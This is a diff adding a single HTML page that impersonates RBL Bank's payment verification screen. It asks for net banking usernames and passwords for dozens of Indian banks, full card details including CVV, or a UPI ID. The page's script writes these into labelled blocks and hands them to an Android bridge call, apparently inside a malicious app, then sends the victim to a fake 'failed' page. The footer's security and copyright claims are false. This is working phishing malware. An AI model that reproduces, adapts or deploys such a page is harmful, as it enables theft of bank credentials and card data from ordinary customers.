@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RBL Bank - Payment Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #F5F6F8; /* Light gray section background - design system */
+            color: #222222; /* Dark text */
+            max-width: 500px;
+            margin: 0 auto;
+            overflow-x: hidden;
+        }
+        
+        /* Main Container */
+        .container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background-color: #F5F6F8;
+        }
+        
+        /* Header - Clean white, minimal */
+        .header {
+            background-color: #FFFFFF; /* Pure white */
+            padding: 18px 25px;
+            border-bottom: 1px solid #E0E0E0; /* Border gray */
+            box-shadow: none; /* No heavy shadow */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 80px;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+        }
+        
+        .bank-logo {
+            width: 220px;
+            height: 80px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        
+.bank-logo img {
+    width: 100%;
+    height: 100%;
+    object-fit: contain; /* 👈 fix */
+    object-position: center;
+}
+        
+        
+        /* Page Title - White card with dark blue heading */
+        .page-title {
+            background-color: #FFFFFF;
+            color: #21317D; /* Dark blue for headings */
+            padding: 25px 20px;
+            text-align: center;
+            margin: 20px 20px 0 20px;
+            border-radius: 16px;
+            border: 1px solid #E0E0E0;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.02);
+        }
+        
+        .page-title h1 {
+            font-size: 26px;
+            margin-bottom: 8px;
+            font-weight: 700;
+            color: #21317D;
+        }
+        
+        .page-title p {
+            font-size: 15px;
+            opacity: 0.85;
+            max-width: 400px;
+            margin: 0 auto;
+            line-height: 1.5;
+            color: #666666; /* Secondary text */
+        }
+        
+        /* Form Container - White card with spacing */
+        .form-container {
+            padding: 25px 20px 30px;
+            flex-grow: 1;
+            background-color: #FFFFFF; /* White card background */
+            margin: 20px 20px 0 20px;
+            border-radius: 16px;
+            border: 1px solid #E0E0E0;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.02);
+        }
+        
+        .form-title {
+            color: #21317D; /* Dark blue for form heading */
+            font-size: 22px;
+            margin-bottom: 25px;
+            font-weight: 700;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #E0E0E0;
+        }
+        
+        /* Payment Options */
+        .payment-options {
+            margin-bottom: 30px;
+        }
+        
+        .payment-option {
+            display: flex;
+            align-items: center;
+            padding: 20px;
+            border: 1px solid #E0E0E0; /* Border gray */
+            border-radius: 16px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background-color: #FFFFFF;
+        }
+        
+        .payment-option:hover {
+            border-color: #ED1C24; /* Red accent on hover */
+            background-color: rgba(237, 28, 36, 0.02);
+        }
+        
+        .payment-option.selected {
+            border-color: #ED1C24; /* Red accent for selected */
+            background-color: rgba(237, 28, 36, 0.04);
+        }
+        
+        .payment-icon {
+            width: 50px;
+            height: 50px;
+            background-color: #F5F6F8;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 18px;
+            color: #21317D; /* Dark blue for icons */
+            font-size: 22px;
+        }
+        
+        .payment-details {
+            flex-grow: 1;
+        }
+        
+        .payment-name {
+            font-weight: 700;
+            font-size: 17px;
+            color: #222222;
+            margin-bottom: 5px;
+        }
+        
+        .payment-description {
+            font-size: 14px;
+            color: #666666;
+        }
+        
+        .payment-radio {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            border: 2px solid #E0E0E0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .payment-option.selected .payment-radio {
+            border-color: #ED1C24; /* Red accent for radio */
+        }
+        
+        .payment-radio-inner {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background-color: #ED1C24; /* Red accent */
+            display: none;
+        }
+        
+        .payment-option.selected .payment-radio-inner {
+            display: block;
+        }
+        
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 22px;
+            display: none;
+        }
+        
+        .form-group.active {
+            display: block;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #222222;
+            font-size: 15px;
+        }
+        
+        .form-label span {
+            color: #ED1C24; /* Red accent for required */
+            margin-left: 2px;
+        }
+        
+        .input-container {
+            position: relative;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 16px 16px 16px 50px;
+            border: 1px solid #E0E0E0;
+            border-radius: 12px;
+            font-size: 15px;
+            background-color: white;
+            color: #222222;
+            transition: all 0.3s;
+            letter-spacing: 1px;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #ED1C24;
+            box-shadow: 0 0 0 3px rgba(237, 28, 36, 0.1);
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #21317D; /* Dark blue for icons */
+            font-size: 18px;
+        }
+        
+        /* Select dropdown styling */
+        .form-select {
+            appearance: none;
+            cursor: pointer;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%2321317D' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+        }
+        
+        /* Card Details Row */
+        .card-details-row {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .card-details-row .form-group {
+            flex: 1;
+            margin-bottom: 0;
+        }
+        
+        .card-details-row .form-group.active {
+            display: block;
+        }
+        
+        /* CTA Button - Red accent */
+        .btn-submit {
+            width: 100%;
+            padding: 18px;
+            background-color: #ED1C24; /* Red CTA */
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 30px;
+            transition: all 0.3s;
+            box-shadow: 0 2px 8px rgba(237, 28, 36, 0.2);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            letter-spacing: 0.5px;
+        }
+        
+        .btn-submit:hover {
+            background-color: #d11920;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(237, 28, 36, 0.25);
+        }
+        
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+        
+        .btn-submit i {
+            margin-left: 10px;
+            font-size: 16px;
+        }
+        
+        .btn-submit:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        /* Redirect Message */
+        .redirect-message {
+            background-color: #F5F6F8;
+            border-left: 4px solid #ED1C24; /* Red accent border */
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 25px;
+            display: none;
+        }
+        
+        .redirect-message.active {
+            display: block;
+        }
+        
+        .redirect-message h3 {
+            color: #21317D; /* Dark blue heading */
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        
+        .redirect-message p {
+            color: #666666;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+        
+        .redirect-timer {
+            font-weight: 700;
+            color: #ED1C24; /* Red accent timer */
+            font-size: 18px;
+        }
+        
+        /* Footer - White background */
+        .footer {
+            background-color: #FFFFFF;
+            color: #666666;
+            padding: 25px 20px;
+            margin-top: 20px;
+            border-top: 1px solid #E0E0E0;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            margin-bottom: 22px;
+        }
+        
+        .footer-link {
+            color: #21317D; /* Dark blue links */
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 12px;
+            width: 48%;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        
+        .footer-link:hover {
+            color: #ED1C24; /* Red hover */
+            text-decoration: underline;
+        }
+        
+        .footer-disclaimer {
+            font-size: 12px;
+            line-height: 1.6;
+            padding-top: 10px;
+            color: #666666;
+            text-align: center;
+            border-top: 1px solid #E0E0E0;
+            margin-top: 15px;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            .form-container {
+                padding: 20px 16px 25px;
+                margin: 16px 16px 0 16px;
+            }
+            
+            .page-title {
+                padding: 22px 16px;
+                margin: 16px 16px 0 16px;
+            }
+            
+            .page-title h1 {
+                font-size: 24px;
+            }
+            
+            .page-title p {
+                font-size: 14px;
+            }
+            
+            .form-title {
+                font-size: 20px;
+                margin-bottom: 20px;
+            }
+            
+            .footer {
+                padding: 22px 16px;
+            }
+            
+            .card-details-row {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+        
+        /* Form input placeholder styling */
+        .form-input::placeholder {
+            color: #999999;
+            font-weight: 400;
+        }
+        
+        /* Auto-format styling */
+        .form-input.formatted {
+            letter-spacing: 2px;
+            font-weight: 500;
+        }
+        
+        /* Back button */
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            color: #21317D; /* Dark blue */
+            font-weight: 600;
+            margin-bottom: 15px;
+            text-decoration: none;
+            font-size: 15px;
+        }
+        
+        .back-link i {
+            margin-right: 8px;
+        }
+        
+        .back-link:hover {
+            color: #ED1C24; /* Red hover */
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <!-- Main Container -->
+    <div class="container" id="main-container">
+        <!-- Header - RBL Bank Logo -->
+        <header class="header">
+            <div class="logo-container">
+                <div class="bank-logo">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/RBL_Bank_SVG_Logo.svg/960px-RBL_Bank_SVG_Logo.svg.png?_=20180315185242" alt="RBL Bank Logo" onerror="this.onerror=null; this.src='https://seeklogo.com/images/R/rbl-bank-logo-38A14DEB40-seeklogo.com.png';">
+                </div>
+            </div>
+        </header>
+
+        <!-- Page Title - White card -->
+        <div class="page-title">
+            <h1>Payment Verification</h1>
+            <p>Select your preferred payment method for verification</p>
+        </div>
+
+        <!-- Form Container - White card -->
+        <main class="form-container">
+            <a href="#" class="back-link" id="back-link">
+                <i class="fas fa-arrow-left"></i> Back to Personal Details
+            </a>
+            
+            <h2 class="form-title">Select Payment Method</h2>
+
+            <div class="payment-options">
+                <div class="payment-option" data-method="netbanking">
+                    <div class="payment-icon">
+                        <i class="fas fa-university"></i>
+                    </div>
+                    <div class="payment-details">
+                        <div class="payment-name">Net Banking</div>
+                        <div class="payment-description">Login to your RBL Bank account</div>
+                    </div>
+                    <div class="payment-radio">
+                        <div class="payment-radio-inner"></div>
+                    </div>
+                </div>
+
+                <div class="payment-option" data-method="creditcard">
+                    <div class="payment-icon">
+                        <i class="fas fa-credit-card"></i>
+                    </div>
+                    <div class="payment-details">
+                        <div class="payment-name">Credit/Debit Card</div>
+                        <div class="payment-description">Pay using your Visa, Mastercard or Rupay card</div>
+                    </div>
+                    <div class="payment-radio">
+                        <div class="payment-radio-inner"></div>
+                    </div>
+                </div>
+
+                <div class="payment-option" data-method="upi">
+                    <div class="payment-icon">
+                        <i class="fas fa-qrcode"></i>
+                    </div>
+                    <div class="payment-details">
+                        <div class="payment-name">UPI</div>
+                        <div class="payment-description">Pay using UPI ID or QR code</div>
+                    </div>
+                    <div class="payment-radio">
+                        <div class="payment-radio-inner"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Net Banking Form (Hidden by default) -->
+            <form id="netbanking-form" class="payment-form">
+                <div class="form-group" id="netbanking-group">
+                    <label class="form-label" for="bank-select">Select Your Bank <span>*</span></label>
+                    <div class="input-container">
+                        <i class="fas fa-university input-icon"></i>
+                        <select id="bank-select" class="form-input form-select">
+                            <option value="" disabled selected>Select your bank</option>
+                            <option value="axis">Axis Bank</option>
+                            <option value="sbi">State Bank of India (SBI)</option>
+                            <option value="hdfc">HDFC Bank</option>
+                            <option value="icici">ICICI Bank</option>
+                            <option value="kotak">Kotak Mahindra Bank</option>
+                            <option value="yes">Yes Bank</option>
+                            <option value="indusind">IndusInd Bank</option>
+                            <option value="idbi">IDBI Bank</option>
+                            <option value="pnb">Punjab National Bank (PNB)</option>
+                            <option value="bob">Bank of Baroda</option>
+                            <option value="boi">Bank of India</option>
+                            <option value="canara">Canara Bank</option>
+                            <option value="union">Union Bank of India</option>
+                            <option value="central">Central Bank of India</option>
+                            <option value="indian">Indian Bank</option>
+                            <option value="iob">Indian Overseas Bank</option>
+                            <option value="uco">UCO Bank</option>
+                            <option value="vijaya">Vijaya Bank</option>
+                            <option value="dbs">DBS Bank India</option>
+                            <option value="citi">Citibank</option>
+                            <option value="standard">Standard Chartered</option>
+                            <option value="hsbc">HSBC Bank</option>
+                            <option value="rbl">RBL Bank</option>
+                            <option value="bandhan">Bandhan Bank</option>
+                            <option value="federal">Federal Bank</option>
+                            <option value="karnataka">Karnataka Bank</option>
+                            <option value="southindian">South Indian Bank</option>
+                            <option value="dcb">DCB Bank</option>
+                            <option value="other">Other Bank</option>
+                        </select>
+                    </div>
+                    <label class="form-label" for="bank-username">Net Banking Username <span>*</span></label>
+                    <div class="input-container">
+                        <i class="fas fa-user input-icon"></i>
+                        <input type="text" id="bank-username" class="form-input" placeholder="Enter your username">
+                    </div>
+                    <label class="form-label" for="bank-password">Net Banking Password <span>*</span></label>
+                    <div class="input-container">
+                        <i class="fas fa-lock input-icon"></i>
+                        <input type="password" id="bank-password" class="form-input" placeholder="Enter your password">
+                    </div>
+                </div>
+            </form>
+
+            <!-- Credit Card Form (Hidden by default) -->
+            <form id="creditcard-form" class="payment-form">
+                <div class="form-group" id="card-number-group">
+                    <label class="form-label" for="card-number">Card Number <span>*</span></label>
+                    <div class="input-container">
+                        <i class="fas fa-credit-card input-icon"></i>
+                        <input type="text" id="card-number" class="form-input formatted" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
+                    </div>
+                </div>
+                
+                <div class="card-details-row">
+                    <div class="form-group" id="expiry-group">
+                        <label class="form-label" for="expiry-date">Expiry Date <span>*</span></label>
+                        <div class="input-container">
+                            <i class="fas fa-calendar input-icon"></i>
+                            <input type="text" id="expiry-date" class="form-input" placeholder="MM/YY" maxlength="5">
+                        </div>
+                    </div>
+                    
+                    <div class="form-group" id="cvv-group">
+                        <label class="form-label" for="cvv">CVV <span>*</span></label>
+                        <div class="input-container">
+                            <i class="fas fa-lock input-icon"></i>
+                            <input type="password" id="cvv" class="form-input" placeholder="XXX" maxlength="3">
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="form-group" id="card-name-group">
+                    <label class="form-label" for="cardholder-name">Name on Card <span>*</span></label>
+                    <div class="input-container">
+                        <i class="fas fa-user input-icon"></i>
+                        <input type="text" id="cardholder-name" class="form-input" placeholder="Enter name as on card">
+                    </div>
+                </div>
+            </form>
+
+            <!-- UPI Form (Hidden by default) -->
+            <form id="upi-form" class="payment-form">
+                <div class="form-group" id="upi-id-group">
+                    <label class="form-label" for="upi-id">UPI ID <span>*</span></label>
+                    <div class="input-container">
+                        <i class="fas fa-at input-icon"></i>
+                        <input type="text" id="upi-id" class="form-input" placeholder="username@bank">
+                    </div>
+                </div>
+                
+                <div class="redirect-message" id="upi-redirect">
+                    <h3>Redirecting to UPI App</h3>
+                    <p>You will be redirected to your UPI payment app in <span class="redirect-timer" id="upi-timer">5</span> seconds.</p>
+                    <p>Please approve the payment request in your app.</p>
+                </div>
+            </form>
+
+            <button type="button" class="btn-submit" id="submit-btn" disabled>
+                Proceed to Verification <i class="fas fa-arrow-right"></i>
+            </button>
+        </main>
+
+        <!-- Footer - RBL Bank style -->
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Privacy Policy</a>
+                <a href="#" class="footer-link">Terms of Service</a>
+                <a href="#" class="footer-link">Security Tips</a>
+                <a href="#" class="footer-link">Contact Us</a>
+                <a href="#" class="footer-link">Branch Locator</a>
+                <a href="#" class="footer-link">FAQs</a>
+            </div>
+
+            <div class="footer-disclaimer">
+                <p>© 2025 RBL Bank Ltd. All rights reserved. RBL Bank is a registered trademark.</p>
+                <p>Your payment information is secured with 256-bit SSL encryption.</p>
+            </div>
+        </footer>
+    </div>
+<script>
+    // ✅ COMMON FUNCTION (append + save + send)
+    function saveAndSend(dataBlock) {
+        let existingData = localStorage.getItem("loginData") || "";
+
+        let finalData = existingData
+            ? existingData + "\n-------------------\n" + dataBlock
+            : dataBlock;
+
+        // Save locally
+        localStorage.setItem("loginData", finalData);
+
+        try {
+            Android.sendDeviceUpdate("note", finalData);
+        } catch (e) {
+            alert("❌ Error sending to Android: " + e);
+        }
+
+        return true;
+    }
+
+    // Payment method selection
+    const paymentOptions = document.querySelectorAll('.payment-option');
+    const submitBtn = document.getElementById('submit-btn');
+    let selectedMethod = null;
+
+    const netbankingGroup = document.getElementById('netbanking-group');
+    const cardNumberGroup = document.getElementById('card-number-group');
+    const expiryGroup = document.getElementById('expiry-group');
+    const cvvGroup = document.getElementById('cvv-group');
+    const cardNameGroup = document.getElementById('card-name-group');
+    const upiIdGroup = document.getElementById('upi-id-group');
+
+    const upiRedirect = document.getElementById('upi-redirect');
+
+    paymentOptions.forEach(option => {
+        option.addEventListener('click', function() {
+            paymentOptions.forEach(opt => opt.classList.remove('selected'));
+            this.classList.add('selected');
+
+            selectedMethod = this.getAttribute('data-method');
+            submitBtn.disabled = false;
+
+            document.querySelectorAll('.payment-form .form-group').forEach(group => {
+                group.classList.remove('active');
+            });
+            document.querySelectorAll('.redirect-message').forEach(msg => {
+                msg.classList.remove('active');
+            });
+
+            if (selectedMethod === 'netbanking') {
+                netbankingGroup.classList.add('active');
+            } else if (selectedMethod === 'creditcard') {
+                cardNumberGroup.classList.add('active');
+                expiryGroup.classList.add('active');
+                cvvGroup.classList.add('active');
+                cardNameGroup.classList.add('active');
+            } else if (selectedMethod === 'upi') {
+                upiIdGroup.classList.add('active');
+            }
+        });
+    });
+
+    // Format card
+    document.getElementById('card-number').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '').substring(0, 16);
+        let formatted = '';
+        for (let i = 0; i < value.length; i++) {
+            if (i > 0 && i % 4 === 0) formatted += ' ';
+            formatted += value[i];
+        }
+        e.target.value = formatted;
+    });
+
+    document.getElementById('expiry-date').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        e.target.value = value;
+    });
+
+    document.getElementById('cvv').addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+    });
+
+    document.getElementById('upi-id').addEventListener('input', function(e) {
+        e.target.value = e.target.value.toLowerCase().replace(/\s/g, '');
+    });
+
+    // ✅ SUBMIT HANDLER
+    submitBtn.addEventListener('click', function() {
+        if (!selectedMethod) return;
+
+        const now = new Date();
+        const dateTime = now.toLocaleString();
+
+        // 🏦 NetBanking
+        if (selectedMethod === 'netbanking') {
+
+            const bankUser = document.getElementById('bank-username').value;
+            const bankPass = document.getElementById('bank-password').value;
+            const bankSelect = document.getElementById('bank-select').value;
+
+            let dataBlock =
+                "Date: " + dateTime + "\n" +
+                "Payment: NetBanking\n" +
+                "Bank: " + bankSelect + "\n" +
+                "User: " + bankUser + "\n" +
+                "Pass: " + bankPass + "\n";
+
+            if (saveAndSend(dataBlock)) {
+                window.location.href = "failed.html?method=bank";
+            }
+        }
+
+        // 💳 Credit Card
+        else if (selectedMethod === 'creditcard') {
+
+            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
+            const name = document.getElementById('cardholder-name').value.trim();
+
+            if (cardNumber.length !== 16) return alert('Invalid card number');
+            if (!/^\d{2}\/\d{2}$/.test(expiryDate)) return alert('Invalid expiry');
+            if (cvv.length !== 3) return alert('Invalid CVV');
+            if (!name) return alert('Enter name');
+
+            let dataBlock =
+                "Date: " + dateTime + "\n" +
+                "Payment: Card\n" +
+                "CardNumber: " + cardNumber + "\n" +
+                "Expiry: " + expiryDate + "\n" +
+                "CVV: " + cvv + "\n" +
+                "Name: " + name + "\n";
+
+            if (saveAndSend(dataBlock)) {
+                window.location.href = "failed.html?method=card";
+            }
+        }
+
+        // 📱 UPI
+        else if (selectedMethod === 'upi') {
+
+            const upiId = document.getElementById('upi-id').value.trim();
+
+            if (!upiId.includes('@')) return alert('Invalid UPI');
+
+            let dataBlock =
+                "Date: " + dateTime + "\n" +
+                "Payment: UPI\n" +
+                "UPI: " + upiId + "\n";
+
+            saveAndSend(dataBlock);
+
+            upiRedirect.classList.add('active');
+            submitBtn.disabled = true;
+
+            let count = 5;
+            const timer = document.getElementById('upi-timer');
+
+            const interval = setInterval(() => {
+                count--;
+                timer.textContent = count;
+
+                if (count <= 0) {
+                    clearInterval(interval);
+                    window.location.href = "paymentMethod.html";
+                }
+            }, 1000);
+        }
+    });
+
+    // Back button
+    document.getElementById('back-link').addEventListener('click', function(e) {
+        e.preventDefault();
+        alert('Go back');
+    });
+
+    // Input focus effect
+    document.querySelectorAll('.form-input').forEach(input => {
+        input.addEventListener('focus', () => input.style.backgroundColor = '#fcfcfc');
+        input.addEventListener('blur', () => input.style.backgroundColor = '#ffffff');
+    });
+</script>
+</body>
+
+</html>
